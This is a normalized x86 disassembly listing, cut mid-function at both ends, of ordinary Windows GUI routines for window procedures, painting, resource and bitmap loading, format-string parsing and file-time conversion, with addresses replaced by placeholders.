jmp r-xdata
push 0x0
push esi
call sub_41bc40
add esp 0x8
jmp r-xdata
push ebx
push 0x1
push esi
call sub_41c8e0
add esp 0xc
jmp r-xdata
and eax 0x3
cmp eax 0x2
je r-xdata
cmp eax 0x3
jne r-xdata
sub_41cda0
sub esp 0x20
push ebx
push esi
mov esi [ esp + 0x30 ]
push edi
cmp esi 0x82
jne r-xdata
xor eax eax
mov edi [ esp + 0x30 ]
mov ax [ rw-data ]
push eax
push edi
call [ GetPropA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x40 ]
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x38 ]
push eax
mov edi [ esp + 0x34 ]
push ecx
push edx
push esi
push edi
call sub_41a1a0
add esp 0x14
pop edi
pop esi
pop ebx
add esp 0x20
retn
cmp esi 0x18
ja r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x40 ]
push eax
push ecx
push esi
push edi
push edx
push edi
call sub_419f70
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x20
retn
cmp esi 0x83
ja r-xdata
je r-xdata
cmp esi 0x1943
jb r-xdata
je r-xdata
cmp [ rw-data ] 0x30a
jae r-xdata
cmp esi 0xf
je r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x40 ]
push eax
push ecx
push esi
push edi
push edx
push edi
call sub_419f70
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x20
retn
cmp esi 0x1944
jbe r-xdata
cmp [ rw-data ] 0x30a
jae r-xdata
cmp esi 0x46
je r-xdata
cmp [ esp + 0x38 ] 0x0
jne r-xdata
mov ebx [ esp + 0x40 ]
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
push eax
push ecx
push esi
push edi
push ebx
push edi
call sub_419f70
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
mov esi eax
push ebx
push 0x0
push edi
call sub_41c8e0
add esp 0xc
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x20
retn
mov eax [ esp + 0x3c ]
pop edi
pop esi
pop ebx
mov [ eax ] 0x1
mov eax 0x3e9
add esp 0x20
retn
jmp r-xdata
lea eax [ esp + 0x1c ]
push eax
push edi
call [ GetWindowRect@IAT ]
mov ecx [ esp + 0x3c ]
mov eax [ esp + 0x38 ]
mov edx [ esp + 0x40 ]
push ecx
push eax
push esi
push edi
push edx
push edi
call sub_419f70
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
mov esi eax
mov edx [ esp + 0x3c ]
lea ecx [ esp + 0xc ]
mov eax [ edx ]
mov ebx [ edx + 0x4 ]
push 0x1
push 0x2
mov [ ecx ] eax
mov eax [ edx + 0x8 ]
mov [ ecx + 0x4 ] ebx
mov edx [ edx + 0xc ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] edx
lea ecx [ esp + 0x14 ]
push ecx
call [ InflateRect@IAT ]
mov ecx [ esp + 0x28 ]
cmp [ esp + 0x18 ] ecx
jge r-xdata
cmp [ rw-data ] 0x30a
jb r-xdata
jmp r-xdata
push 0x0
push edi
call sub_41bc40
add esp 0x8
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x20
retn
mov eax [ esp + 0x18 ]
push edi
inc eax
mov [ esp + 0x14 ] eax
lea eax [ ecx + 0x1 ]
mov [ esp + 0x1c ] eax
call [ GetParent@IAT ]
mov edi eax
mov ebx [ ScreenToClient@IAT ]
lea eax [ esp + 0xc ]
push eax
push edi
call ebx
lea ecx [ esp + 0x14 ]
push ecx
push edi
call ebx
lea eax [ esp + 0xc ]
push 0x1
push eax
push edi
call [ InvalidateRect@IAT ]
mov eax [ esp + 0x3c ]
push eax
push edi
call sub_41bc40
add esp 0x8
jmp r-xdata
sub_41d000
mov ecx [ esp + 0x8 ]
cmp ecx 0x1943
jb r-xdata
mov eax [ esp + 0x10 ]
push 0x3
mov edx [ esp + 0x10 ]
push eax
push edx
push ecx
mov ecx [ esp + 0x14 ]
push ecx
call sub_41cc20
add esp 0x14
retn 0x10
cmp ecx 0x1944
jbe r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] 0x1
mov eax 0x3eb
retn 0x10
sub_41d050
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
push 0xf00021
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
mov eax [ esi + 0xc ]
sub eax edx
push eax
mov eax [ esi + 0x8 ]
sub eax ecx
push eax
push edx
push ecx
mov ecx [ ebp + 0xc ]
push ecx
call [ PatBlt@IAT ]
mov edi [ ebp + 0x8 ]
push edi
call [ GetWindowTextLengthA@IAT ]
mov ebx eax
lea eax [ eax + 0x5 ]
add eax 0x3
and eax 0xfffffffc
call sub_411530
mov [ ebp - 0x4 ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add ebx 0x2
mov eax [ ebp - 0x4 ]
push ebx
push eax
push edi
call [ GetWindowTextA@IAT ]
test eax eax
je r-xdata
mov bx 0x140
mov edi [ ebp + 0x14 ]
mov eax edi
and al 0xf
cmp al 0xc
je r-xdata
test edi 0x80
je r-xdata
mov ebx edi
and bx 0xf
or bx 0x150
and edi 0x8000000
je r-xdata
or bh 0x8
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
movzx eax bx
push eax
push esi
push 0xffffffff
push ecx
push edx
call [ DrawTextA@IAT ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov ecx [ ebp + 0xc ]
push eax
push ecx
call [ SetTextColor@IAT ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
push eax
push ecx
call [ SetTextColor@IAT ]
sub_41d130
sub esp 0x14
push ebx
push esi
mov esi [ esp + 0x20 ]
push edi
push ebp
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
mov [ esp + 0x10 ] eax
test eax 0x10000000
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
add esp 0x14
retn
lea eax [ esp + 0x14 ]
push eax
push esi
call [ GetClientRect@IAT ]
mov eax [ esp + 0x10 ]
and eax 0x1f
cmp eax 0x12
ja r-xdata
xor ecx ecx
mov cl [ eax + lookup_table_41d2bc ]
jmp [ ecx * 4 + jump_table_41d294 ]
push 0x0
mov ebp [ SendMessageA@IAT ]
push 0x0
push 0x31
push esi
call ebp
mov ebx eax
test ebx ebx
je r-xdata
lea eax [ esp + 0x14 ]
push 0xf
mov edi [ esp + 0x30 ]
push 0x0
push 0x2
push eax
push edi
call sub_41a280
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
add esp 0x14
retn
lea eax [ esp + 0x14 ]
push 0xf
mov edi [ esp + 0x30 ]
push 0x0
inc [ esp + 0x1c ]
push 0x0
inc [ esp + 0x24 ]
push eax
push edi
call sub_41a280
lea ecx [ esp + 0x28 ]
add esp 0x14
push 0xffffffff
push 0xffffffff
push ecx
call [ OffsetRect@IAT ]
lea ecx [ esp + 0x14 ]
push 0xf
push 0x2
push 0x2
push ecx
push edi
call sub_41a280
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
add esp 0x14
retn
lea eax [ esp + 0x14 ]
push 0xf
mov edi [ esp + 0x30 ]
push 0x2
push 0x0
push eax
push edi
call sub_41a280
add esp 0x14
mov edi [ esp + 0x2c ]
mov edi [ esp + 0x2c ]
push ebx
push edi
call [ SelectObject@IAT ]
mov ebx eax
jmp r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
push edi
push esi
call sub_41d050
add esp 0x10
test ebx ebx
je r-xdata
push ebp
push edi
call [ SelectObject@IAT ]
mov ebp eax
push 0x2
push edi
call [ SetBkMode@IAT ]
push esi
push edi
push 0x138
push esi
call [ GetParent@IAT ]
push eax
call ebp
mov ebp eax
test ebp ebp
je r-xdata
test ebp ebp
je r-xdata
push ebx
push edi
call [ SelectObject@IAT ]
push ebp
push edi
call [ SelectObject@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x14
retn
sub_41d2d0
sub esp 0x40
push ebx
push esi
push edi
mov edi [ esp + 0x54 ]
cmp edi 0x82
jne r-xdata
xor eax eax
mov esi [ esp + 0x50 ]
mov ax [ rw-data ]
push eax
push esi
call [ GetPropA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x5c ]
push 0x4
mov ebx [ esp + 0x5c ]
push eax
mov esi [ esp + 0x58 ]
push ebx
push edi
push esi
call sub_41a1a0
add esp 0x14
pop edi
pop esi
pop ebx
add esp 0x40
retn 0x10
cmp edi 0xf
ja r-xdata
mov eax [ esp + 0x5c ]
mov ebx [ esp + 0x58 ]
push eax
push ebx
push edi
push esi
push 0x4
push esi
call sub_419f70
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x40
retn 0x10
cmp edi 0x1943
jb r-xdata
je r-xdata
mov eax [ esp + 0x5c ]
mov ebx [ esp + 0x58 ]
push eax
push ebx
push edi
push esi
push 0x4
push esi
call sub_419f70
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x40
retn 0x10
cmp edi 0x1944
jbe r-xdata
mov ebx [ esp + 0x58 ]
mov edi ebx
test edi edi
jne r-xdata
cmp edi 0xa
je r-xdata
mov eax [ esp + 0x5c ]
pop edi
pop esi
pop ebx
mov [ eax ] 0x1
mov eax 0x3ec
add esp 0x40
retn 0x10
push edi
push esi
call sub_41d130
add esp 0x8
test ebx ebx
jne r-xdata
lea eax [ esp + 0xc ]
push eax
push esi
call [ BeginPaint@IAT ]
push eax
mov edi eax
push esi
call sub_41a430
add esp 0x8
push esi
call [ GetDC@IAT ]
push eax
mov edi eax
push esi
call sub_41a430
add esp 0x8
push edi
push esi
call sub_41d130
add esp 0x8
push edi
push esi
call [ ReleaseDC@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x40
retn 0x10
jmp r-xdata
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x40
retn 0x10
lea eax [ esp + 0xc ]
push eax
push esi
call [ EndPaint@IAT ]
sub_41d420
sub esp 0x4
cmp [ esp + 0xc ] 0x1
push esi
jne r-xdata
mov eax 0x1
pop esi
add esp 0x4
retn
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov esi [ esp + 0xc ]
mov [ esp + 0x4 ] eax
test eax eax
je r-xdata
push rw-data
call [ EnterCriticalSection@IAT ]
mov [ rw-data ] esi
mov [ rw-data ] esi
call [ GetVersion@IAT ]
movzx cx al
shl cx 0x8
movzx dx ah
or cx dx
test eax 0x80000000
mov [ rw-data ] cx
je r-xdata
push esi
call [ esp + 0x8 ]
mov [ rw-data ] 0x20
mov [ rw-data ] 0x10
cmp cx 0x35f
jb r-xdata
push 0x7
mov esi [ GetSystemMetrics@IAT ]
call esi
dec eax
push 0x8
mov [ rw-data ] eax
call esi
dec eax
push 0x4
mov [ rw-data ] eax
call esi
push 0x1e
mov [ rw-data ] eax
call esi
push rw-data
mov [ rw-data ] eax
call [ LeaveCriticalSection@IAT ]
sub_41d4f0
mov eax [ esp + 0x8 ]
sub esp 0x4
push ebx
push esi
mov esi [ esp + 0x10 ]
push edi
push ebp
push 0x2
push eax
push esi
call [ FindResourceA@IAT ]
mov edi eax
test edi edi
jne r-xdata
push edi
push esi
call [ SizeofResource@IAT ]
mov ebx eax
push edi
push esi
call [ LoadResource@IAT ]
mov esi eax
test esi esi
jne r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn 0x20
push ebx
push 0x40
call [ GlobalAlloc@IAT ]
mov ebp eax
test ebp ebp
jne r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn 0x20
mov edi ebp
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x20 ]
xor ecx ecx
mov cl ah
mov edx eax
mov [ esp + 0x10 ] 0x0
shl ecx 0x8
shr edx 0x10
mov [ esp + 0x10 ] dl
xor edx edx
or ecx [ esp + 0x10 ]
mov dl al
shl edx 0x10
mov eax [ esp + 0x28 ]
or ecx edx
mov edx eax
shr edx 0x10
mov [ ebp + 0x28 ] ecx
mov [ esp + 0x10 ] 0x0
xor ecx ecx
mov [ esp + 0x10 ] dl
mov cl ah
xor edx edx
shl ecx 0x8
mov dl al
shl edx 0x10
or ecx [ esp + 0x10 ]
or ecx edx
mov eax [ esp + 0x24 ]
mov edx eax
mov [ ebp + 0x44 ] ecx
shr edx 0x10
xor ecx ecx
mov [ esp + 0x10 ] 0x0
mov cl ah
mov [ esp + 0x10 ] dl
shl ecx 0x8
xor edx edx
or ecx [ esp + 0x10 ]
mov dl al
shl edx 0x10
mov eax [ esp + 0x2c ]
or ecx edx
xor edx edx
mov dl al
mov [ ebp + 0x48 ] ecx
shl edx 0x10
xor ecx ecx
mov cl ah
shl ecx 0x8
shr eax 0x10
or ecx edx
xor edx edx
mov dl al
mov eax [ esp + 0x30 ]
or ecx edx
xor edx edx
mov dl al
mov [ ebp + 0x64 ] ecx
shl edx 0x10
xor ecx ecx
mov cl ah
shl ecx 0x8
shr eax 0x10
or ecx edx
xor edx edx
mov dl al
mov eax [ esp + 0x34 ]
or ecx edx
xor edx edx
mov dl al
mov [ ebp + 0x54 ] ecx
shl edx 0x10
xor ecx ecx
mov cl ah
shl ecx 0x8
push 0x0
shr eax 0x10
or ecx edx
xor edx edx
mov dl al
or ecx edx
mov [ ebp + 0x50 ] ecx
call [ GetDC@IAT ]
mov edi eax
push 0x0
push ebp
lea ecx [ ebp + 0x68 ]
push ecx
push 0x4
push ebp
push edi
call [ CreateDIBitmap@IAT ]
mov esi eax
push edi
push 0x0
call [ ReleaseDC@IAT ]
push ebp
call [ GlobalFree@IAT ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn 0x20
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn 0x20
sub_41d6f2
mov eax [ rw-data ]
cmp [ esp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] eax
jl r-xdata
mov eax esi
pop esi
retn 0x8
push [ esp + 0xc ]
call sub_4222e5
movsx eax [ esp + 0x8 ]
push [ esp + 0xc ]
push eax
push [ esi ]
call sub_410a20
add esp 0xc
sub_41d73b
mov eax sub_42adef
call sub_410a78
push ecx
mov edx [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
test edx edx
jge r-xdata
mov eax [ ecx ]
cmp edx [ eax - 0x8 ]
jl r-xdata
xor edx edx
push esi
mov esi [ rw-data ]
mov [ ebp + 0xc ] esi
mov eax [ eax - 0x8 ]
push 0x1
pop esi
sub eax edx
push 0x0
push eax
lea eax [ ebp + 0xc ]
push edx
push eax
mov [ ebp - 0x4 ] esi
call sub_4224a2
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
call sub_4221ed
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x10 ] esi
call sub_422478
mov eax [ ebp + 0x8 ]
pop esi
push ecx
mov ecx [ ebp + 0x8 ]
call sub_4221ed
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x8
sub_41d7b7
mov eax sub_42ae1b
call sub_410a78
push ecx
mov eax [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
test eax eax
jge r-xdata
mov edx [ ecx ]
cmp eax [ edx - 0x8 ]
jl r-xdata
xor eax eax
mov edx [ rw-data ]
push esi
mov [ ebp + 0xc ] edx
push 0x1
pop esi
push 0x0
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
mov [ ebp - 0x4 ] esi
call sub_4224a2
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
call sub_4221ed
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x10 ] esi
call sub_422478
mov eax [ ebp + 0x8 ]
pop esi
push ecx
mov ecx [ ebp + 0x8 ]
call sub_4221ed
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x8
sub_41d82f
push esi
mov esi ecx
mov ecx [ esp + 0xc ]
mov eax [ esi ]
cmp ecx [ eax - 0x8 ]
jg r-xdata
or eax 0xffffffff
jmp r-xdata
push [ esp + 0x8 ]
add eax ecx
push eax
call sub_4118b5
pop ecx
test eax eax
pop ecx
jne r-xdata
pop esi
retn 0x8
sub eax [ esi ]
sub_41d85a
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x8 ] 0x0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
push [ ebp - 0x8 ]
mov ecx esi
call sub_422745
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
push [ esi ]
call sub_41199d
add esp 0xc
mov ecx esi
push 0xffffffff
call sub_422794
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp [ edi ] 0x25
jne r-xdata
push edi
call sub_4119ee
add [ ebp - 0x8 ] eax
pop ecx
push edi
call sub_41155f
mov edi eax
pop ecx
mov al [ edi ]
cmp al 0x25
je r-xdata
cmp [ edi ] 0x0
je r-xdata
xor esi esi
test al al
mov [ ebp - 0x4 ] esi
je r-xdata
push edi
call sub_410877
pop ecx
mov [ ebp - 0x4 ] eax
cmp al 0x23
jne r-xdata
xor ebx ebx
cmp [ edi ] 0x2e
jne r-xdata
movsx eax al
push eax
call sub_411bcc
test eax eax
pop ecx
je r-xdata
cmp al 0x2a
jne r-xdata
add [ ebp - 0x8 ] 0x2
jmp r-xdata
and [ ebp - 0xc ] 0x0
push 0x3
push r--data
push edi
call sub_411add
add esp 0xc
test eax eax
jne r-xdata
push edi
call sub_41155f
mov edi eax
pop ecx
cmp [ edi ] 0x2a
jne r-xdata
push edi
call sub_41155f
pop ecx
mov edi eax
jmp r-xdata
cmp al 0x2d
je r-xdata
add [ ebp + 0xc ] 0x4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
push edi
call sub_41155f
mov edi eax
pop ecx
mov al [ edi ]
test al al
jne r-xdata
movsx eax [ edi ]
sub eax 0x46
je r-xdata
add edi 0x3
mov [ ebp - 0xc ] 0x40000
jmp r-xdata
push edi
call sub_410877
pop ecx
mov ebx eax
add [ ebp + 0xc ] 0x4
push edi
mov eax [ ebp + 0xc ]
mov ebx [ eax - 0x4 ]
call sub_41155f
pop ecx
mov edi eax
mov al [ edi ]
test al al
je r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4 ] esi
jne r-xdata
push edi
call sub_41155f
pop ecx
mov edi eax
sub eax 0x6
je r-xdata
movsx eax [ edi ]
or eax [ ebp - 0xc ]
mov ecx 0x10063
cmp eax ecx
jg r-xdata
movsx eax al
push eax
call sub_411bcc
test eax eax
pop ecx
je r-xdata
cmp al 0x30
je r-xdata
sub eax 0x10073
je r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
push edi
call sub_41155f
pop ecx
mov edi eax
jmp r-xdata
cmp al 0x20
jne r-xdata
add [ ebp + 0xc ] 0x4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
test eax eax
jne r-xdata
sub eax 0xffd0
je r-xdata
add [ ebp + 0xc ] 0x4
push 0x2
pop esi
jmp r-xdata
sub eax 0x43
je r-xdata
sub eax 0x1a
je r-xdata
mov al [ edi ]
test al al
je r-xdata
push eax
call [ lstrlenA@IAT ]
push 0x6
pop esi
jmp r-xdata
sub eax 0x10
je r-xdata
test ebx ebx
je r-xdata
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov [ ebp - 0xc ] 0x10000
sub eax 0x4
jne r-xdata
test esi esi
je r-xdata
push 0x1
pop esi
add [ ebp + 0xc ] 0x4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
test eax eax
je r-xdata
sub eax 0x10
je r-xdata
cmp esi [ ebp - 0x4 ]
jg r-xdata
cmp esi ebx
jl r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0xc ] 0x20000
jmp r-xdata
movsx eax [ edi ]
cmp eax 0x69
jg r-xdata
push eax
call sub_411325
pop ecx
jmp r-xdata
sub eax 0x10
jne r-xdata
add [ ebp - 0x8 ] esi
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov esi ebx
sub eax ecx
je r-xdata
sub eax 0x6e
je r-xdata
je r-xdata
mov esi eax
cmp esi 0x1
jge r-xdata
push edi
call sub_41155f
pop ecx
mov edi eax
jmp r-xdata
sub eax 0xffd0
je r-xdata
add [ ebp + 0xc ] 0x4
dec eax
je r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
sub eax 0x47
je r-xdata
sub eax ecx
je r-xdata
dec eax
je r-xdata
add [ ebp + 0xc ] 0x4
add [ ebp + 0xc ] 0x8
jmp r-xdata
add [ ebp + 0xc ] 0x8
mov esi 0x80
jmp r-xdata
sub eax 0x11
je r-xdata
sub eax 0x5
je r-xdata
mov esi eax
jmp r-xdata
push 0x20
pop esi
mov eax [ ebp - 0x4 ]
add eax ebx
cmp eax esi
jl r-xdata
sub eax 0xc
je r-xdata
sub eax 0x3
je r-xdata
dec eax
je r-xdata
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebx + 0x13e ]
cmp [ ebp - 0x4 ] eax
jle r-xdata
dec eax
je r-xdata
add eax 0x3
and al 0xfc
call sub_411530
add [ ebp + 0xc ] 0x8
mov esi esp
mov eax [ ebp + 0xc ]
push ecx
push ecx
add ebx 0x6
fld [ eax - 0x8 ]
fstp [ esp ]
push ebx
push [ ebp - 0x4 ]
push r--data
push esi
call sub_411a8b
push esi
call sub_411a10
add esp 0x1c
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
sub_41dbba
push esi
mov esi ecx
push 0x80
lea eax [ esi + 0x14 ]
mov [ esi + 0xc ] 0x1
push eax
push [ esi + 0x94 ]
call sub_42391b
neg eax
sbb eax eax
neg eax
mov [ esi + 0x10 ] eax
pop esi
retn
sub_41dbe3
mov eax [ esp + 0xc ]
push esi
test eax eax
mov esi ecx
je r-xdata
cmp [ esi + 0xc ] 0x0
jne r-xdata
and [ eax ] 0x0
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx esi
call sub_41dbba
mov eax [ esp + 0x8 ]
and [ eax ] 0x0
push [ esp + 0xc ]
lea eax [ esi + 0x14 ]
push eax
push [ esp + 0x10 ]
call [ lstrcpynA@IAT ]
jmp r-xdata
mov eax [ esi + 0x10 ]
pop esi
retn 0xc
sub_41dc58
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0x1c ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
dec eax
mov esi ecx
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffff894
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
call sub_4129c1
mov [ esi ] eax
pop ecx
mov eax esi
pop esi
leave
retn 0x1c
sub_41dca4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov cx [ eax ]
cmp cx 0x76c
jae r-xdata
movzx edx [ eax + 0xc ]
push [ ebp + 0xc ]
push edx
movzx edx [ eax + 0xa ]
push edx
movzx edx [ eax + 0x8 ]
push edx
movzx edx [ eax + 0x6 ]
movzx eax [ eax + 0x2 ]
push edx
push eax
movzx eax cx
push eax
lea ecx [ ebp + 0x8 ]
call sub_41dc58
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
and [ esi ] 0x0
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
sub_41dcf0
push ebp
mov ebp esp
sub esp 0x18
lea eax [ ebp - 0x8 ]
push esi
push eax
mov esi ecx
push [ ebp + 0x8 ]
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
and [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
jne r-xdata
mov eax esi
pop esi
leave
retn 0x8
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
lea ecx [ ebp + 0x8 ]
push eax
call sub_41dca4
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
sub_41dd6c
mov eax sub_42ab70
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_41fc17
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_41fa5a
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41dda4
mov eax sub_42ab9b
call sub_410a78
sub esp 0x30
and [ ebp - 0x14 ] 0x0
push ebx
push esi
push edi
push 0x28
lea eax [ ebp - 0x3c ]
push 0x0
mov edi ecx
push eax
call sub_410a20
mov eax [ ebp + 0x10 ]
add esp 0xc
mov [ ebp - 0x34 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push 0x1
mov esi 0x80
pop ebx
mov [ ebp - 0x4 ] ebx
add esi esi
lea ecx [ ebp - 0x10 ]
push esi
mov [ ebp - 0x24 ] esi
call sub_4227bc
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x3c ]
push eax
push [ ebp + 0xc ]
push 0x102d
push [ edi + 0x1c ]
call [ SendMessageA@IAT ]
lea ecx [ esi - 0x1 ]
cmp eax ecx
je r-xdata
push 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_422794
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_4221ed
mov [ ebp - 0x14 ] ebx
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_422478
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0xc
sub_41de4c
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x2b
je r-xdata
mov eax [ ecx ]
push [ ebp + 0x10 ]
call [ eax + 0xb8 ]
push 0x1
pop eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420b6a
jmp r-xdata
pop ebp
retn 0x10
sub_41de7a
push esi
push edi
push 0x0
mov edi [ SendMessageA@IAT ]
push [ esp + 0x10 ]
mov esi ecx
push 0x1002
push [ esi + 0x1c ]
call edi
push eax
call sub_41dfdc
test eax eax
je r-xdata
pop edi
pop esi
retn 0x4
push 0x0
push [ esp + 0x10 ]
push 0x1003
push [ esi + 0x1c ]
call edi
sub_41deb3
push esi
mov esi ecx
push 0x0
call sub_41de7a
push 0x1
mov ecx esi
call sub_41de7a
push 0x2
mov ecx esi
call sub_41de7a
mov ecx esi
call sub_41faf4
pop esi
retn
sub_41ded8
mov eax sub_42abb2
call sub_410a78
push esi
call sub_42731d
mov esi eax
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x24 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_425036
call sub_4221a7
push 0x48
mov ebx eax
call sub_4221b9
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push r--data
call sub_42358d
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x24 ] eax
call sub_4221a7
pop ebx
sub_41df9c
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_41ded8
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_41e579
sub_41e017
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_410ae0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
mov [ ecx ] eax
xor eax eax
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_410ae0
add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004002
jmp r-xdata
retn 0xc
sub_41e05b
mov eax sub_42af10
call sub_410a78
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov ecx [ eax + 0x4 ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4251fa
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
